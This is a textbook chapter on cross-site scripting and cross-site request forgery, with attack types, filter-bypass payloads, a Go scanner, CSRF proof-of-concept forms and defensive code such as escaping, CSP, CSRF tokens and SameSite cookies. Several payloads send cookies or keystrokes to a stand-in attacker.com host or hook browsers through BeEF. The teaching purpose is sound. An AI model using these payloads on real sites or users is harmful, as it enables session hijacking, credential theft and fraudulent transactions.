# Chapter 24: XSS and CSRF — Attacking the Browser

*Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) are the two most common web vulnerabilities. XSS hijacks users' browsers; CSRF makes users' browsers perform actions they didn't intend.*

---

## Cross-Site Scripting (XSS)

XSS lets an attacker inject JavaScript into a page that other users see. That JavaScript runs in the victim's browser with the victim's permissions.

**What XSS can do:**
- Steal session cookies → take over account
- Keylog password inputs
- Redirect to phishing site
- Execute arbitrary actions as the victim
- Capture screenshots
- Serve as a pivot for browser-based attacks

---

## XSS Types

### 1. Reflected XSS

The malicious script comes from the current HTTP request (URL parameter, form field) and is immediately "reflected" back in the response.

```
URL: http://site.com/search?q=<script>alert(1)</script>
Response: <p>Results for: <script>alert(1)</script></p>
```

The victim must click a link containing the XSS payload. Common in search fields, error messages, redirect parameters.

### 2. Stored XSS (Persistent)

The malicious script is stored in the server's database and served to all visitors.

```
Attacker posts a comment:
"Great article! <script>document.location='https://evil.com/steal?c='+document.cookie</script>"

Every user who views the comment page gets their cookies stolen.
```

Stored XSS is far more dangerous — no need for the victim to click a link.

### 3. DOM-based XSS

The vulnerability is in client-side JavaScript itself. The page reads from an unsafe source (URL fragment, `document.referrer`, etc.) and writes it directly to the DOM.

```javascript
// Vulnerable code
document.getElementById("name").innerHTML = 
    new URLSearchParams(window.location.search).get("name");

// Attack URL:
// ?name=<img src=x onerror=alert(1)>
```

No server-side involvement — the server response is clean. The browser's own JS creates the vulnerability.

---

## XSS Payloads

### Basic Detection

```html
<!-- Alert box — just proves execution, visible to user -->
<script>alert('XSS')</script>

<!-- Alternative syntax (bypasses some filters) -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>

<!-- Filter bypass: mixed case -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Filter bypass: encoding -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

<!-- Filter bypass: no quotes -->
<img src=x onerror=alert`1`>
```

### Session Cookie Theft

```javascript
// Steal cookie and send to attacker server
new Image().src = "https://attacker.com/steal?c=" + document.cookie;

// More reliable (larger data)
fetch("https://attacker.com/steal", {
    method: "POST",
    body: document.cookie
});

// With XMLHttpRequest
var x = new XMLHttpRequest();
x.open("GET", "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie));
x.send();
```

### Keylogger

```javascript
// Log every keypress to attacker server
document.addEventListener("keydown", function(e) {
    fetch("https://attacker.com/keys?k=" + encodeURIComponent(e.key) + 
          "&u=" + encodeURIComponent(window.location.href));
});
```

### BeEF (Browser Exploitation Framework)

Professional tool for post-XSS exploitation:
```html
<!-- Hook payload (served from BeEF server) -->
<script src="http://attacker.com:3000/hook.js"></script>

<!-- Once victim's browser is hooked, you control it:
     - Capture keystrokes
     - Enumerate browser plugins
     - Scan internal network
     - Launch network exploits against the victim's internal network
     - Proxy attacks through victim
-->
```

---

## Finding XSS

### Manual Testing

Test every input field, URL parameter, and HTTP header for XSS:

```
1. Start with basic payloads: <script>alert(1)</script>
2. Look at how the input is reflected:
   - In HTML body: try <script>, <img>, <svg>
   - In attribute: try "><script> or ' onmouseover='
   - In JavaScript string: try ';alert(1)//
   - In URL: try javascript:alert(1)

3. Identify the context:
   Context: <p>USER INPUT</p>          → try <script>
   Context: <input value="USER INPUT"> → try "><script>
   Context: var x = "USER INPUT";      → try ";alert(1)//
```

### Burp Suite Active Scanner

Run an active scan on web forms and URL parameters. Burp's scanner detects most reflected and some stored XSS.

### Automation with Dalfox

```bash
# Dalfox — fast XSS scanner
go install github.com/hahwul/dalfox/v2@latest

# Scan a URL
dalfox url "http://vulnerable.site/page?q=test"

# Scan with custom header
dalfox url "http://vulnerable.site/" --header "Cookie: session=abc"
```

---

## Go: XSS Testing Tool

```go
package main

import (
    "flag"
    "fmt"
    "io"
    "net/http"
    "net/url"
    "strings"
    "time"
)

var xssPayloads = []string{
    `<script>alert(1)</script>`,
    `<img src=x onerror=alert(1)>`,
    `<svg onload=alert(1)>`,
    `"><script>alert(1)</script>`,
    `'><script>alert(1)</script>`,
    `javascript:alert(1)`,
    `<ScRiPt>alert(1)</ScRiPt>`,
    `<script>alert\`1\`</script>`,
}

var xssIndicators = []string{
    `<script>alert(1)</script>`,
    `<img src=x onerror=alert(1)>`,
    `<svg onload=alert(1)>`,
    `onerror=alert(1)`,
    `onload=alert(1)`,
    `javascript:alert`,
}

type XSSResult struct {
    URL     string
    Param   string
    Payload string
    Found   bool
}

func testXSS(client *http.Client, targetURL, param, payload string) XSSResult {
    u, err := url.Parse(targetURL)
    if err != nil {
        return XSSResult{}
    }
    
    q := u.Query()
    q.Set(param, payload)
    u.RawQuery = q.Encode()
    
    resp, err := client.Get(u.String())
    if err != nil {
        return XSSResult{URL: targetURL, Param: param, Payload: payload, Found: false}
    }
    defer resp.Body.Close()
    
    body, _ := io.ReadAll(resp.Body)
    bodyStr := string(body)
    
    // Check if payload is reflected unescaped
    for _, indicator := range xssIndicators {
        if strings.Contains(bodyStr, indicator) {
            return XSSResult{
                URL:     u.String(),
                Param:   param,
                Payload: payload,
                Found:   true,
            }
        }
    }
    
    return XSSResult{URL: u.String(), Param: param, Payload: payload, Found: false}
}

func main() {
    target := flag.String("url", "", "Target URL with parameters (e.g. http://site.com/page?q=test)")
    flag.Parse()
    
    if *target == "" {
        fmt.Println("Usage: xsstester -url 'http://site.com/page?q=test'")
        return
    }
    
    u, err := url.Parse(*target)
    if err != nil {
        panic(err)
    }
    
    params := u.Query()
    client := &http.Client{Timeout: 10 * time.Second}
    
    fmt.Printf("Testing %d parameters with %d payloads...\n\n",
        len(params), len(xssPayloads))
    
    found := 0
    for param := range params {
        for _, payload := range xssPayloads {
            result := testXSS(client, *target, param, payload)
            if result.Found {
                fmt.Printf("[VULNERABLE] Param: %s\n", param)
                fmt.Printf("  Payload: %s\n", payload)
                fmt.Printf("  URL: %s\n\n", result.URL)
                found++
                break  // Found one for this param, move on
            }
        }
    }
    
    if found == 0 {
        fmt.Println("No XSS found in tested parameters.")
        fmt.Println("Note: This only tests reflected GET parameter XSS.")
    }
}
```

---

## XSS Prevention

```go
// Go: HTML escape all user input before inserting into HTML
import "html/template"

// Template automatically escapes:
tmpl := template.Must(template.New("page").Parse(`
<html>
<body>
<p>Hello, {{.Name}}</p>
</body>
</html>
`))

// .Name is automatically HTML-escaped
// <script> becomes &lt;script&gt;

// Manual escaping
import "html"
safe := html.EscapeString(userInput)  // escapes <, >, &, ", '
```

**Content Security Policy:**
```
Content-Security-Policy: script-src 'self'
```
Even if XSS is injected, CSP prevents inline scripts from running.

---

## Cross-Site Request Forgery (CSRF)

CSRF tricks a user's browser into making requests to a site where the user is authenticated.

### How CSRF Works

```
1. Alice logs into her bank at bank.com
   Browser stores session cookie: session=secure123

2. Alice visits attacker.com (malicious site)

3. attacker.com contains:
   <img src="https://bank.com/transfer?to=attacker&amount=50000">
   
4. Alice's browser automatically fetches that URL
   INCLUDING the bank.com session cookie!

5. Bank sees: "Session 'secure123' (Alice) wants to transfer $50,000"
   Bank executes the transfer!
```

### CSRF Payloads

```html
<!-- GET request CSRF (simple, triggered by loading any content) -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- POST request CSRF (auto-submitting form) -->
<form action="https://bank.com/transfer" method="POST" id="evil">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="50000">
</form>
<script>document.getElementById("evil").submit();</script>

<!-- JSON POST (requires CORS misconfiguration to work) -->
<script>
fetch("https://bank.com/api/transfer", {
    method: "POST",
    credentials: "include",  // include cookies
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({to: "attacker", amount: 50000})
});
</script>
```

---

## Finding CSRF

1. Find a state-changing request (transfer money, change email, delete account)
2. Check if the request has a CSRF token in the body or headers
3. If no token: try replaying the request without cookies from a different browser session
4. If token exists: try removing it, using an old one, using another user's token

```bash
# In Burp Suite:
# 1. Intercept a POST request
# 2. Right-click → "Generate CSRF PoC"
# 3. Open in browser while logged in — if it works, it's CSRF!
```

---

## CSRF Prevention

### CSRF Tokens

Every form includes a unique, unpredictable token. The server validates it.

```go
// Generate CSRF token
func generateCSRFToken() string {
    b := make([]byte, 32)
    rand.Read(b)
    return base64.URLEncoding.EncodeToString(b)
}

// Store in session
session["csrf_token"] = generateCSRFToken()

// Include in form
<input type="hidden" name="csrf_token" value="{{.CSRFToken}}">

// Validate on POST
func handleTransfer(w http.ResponseWriter, r *http.Request) {
    submitted := r.FormValue("csrf_token")
    expected := session["csrf_token"]
    if !hmac.Equal([]byte(submitted), []byte(expected)) {
        http.Error(w, "Invalid CSRF token", http.StatusForbidden)
        return
    }
    // proceed with transfer
}
```

### SameSite Cookie Attribute

The modern solution — prevents cookies from being sent on cross-site requests:

```
Set-Cookie: session=abc123; SameSite=Strict; HttpOnly; Secure
```

- `SameSite=Strict`: Cookie never sent cross-site → CSRF impossible
- `SameSite=Lax`: Cookie not sent on cross-site sub-requests (images, forms) but sent on top-level navigation

---

## Summary

| Vulnerability | Root cause | Attack | Prevention |
|---------------|-----------|--------|-----------|
| Reflected XSS | User input reflected unescaped | Script in URL parameter | HTML encode output |
| Stored XSS | User input stored, displayed unescaped | Script in database | HTML encode output, CSP |
| DOM XSS | Client JS writes user input to DOM | Manipulate URL fragment | `textContent` not `innerHTML` |
| CSRF | Browser auto-sends cookies on any request | Form/image on evil site | CSRF tokens, SameSite |

---

## Exercises

1. Set up DVWA and exploit the XSS (Reflected) challenge at all three difficulty levels
2. Build a CSRF PoC that changes a user's email address on DVWA
3. Use Dalfox to scan DVWA's XSS pages
4. Write a Go handler that properly uses CSRF tokens to protect a form
5. Exploit the stored XSS on DVWA to steal the admin's session cookie
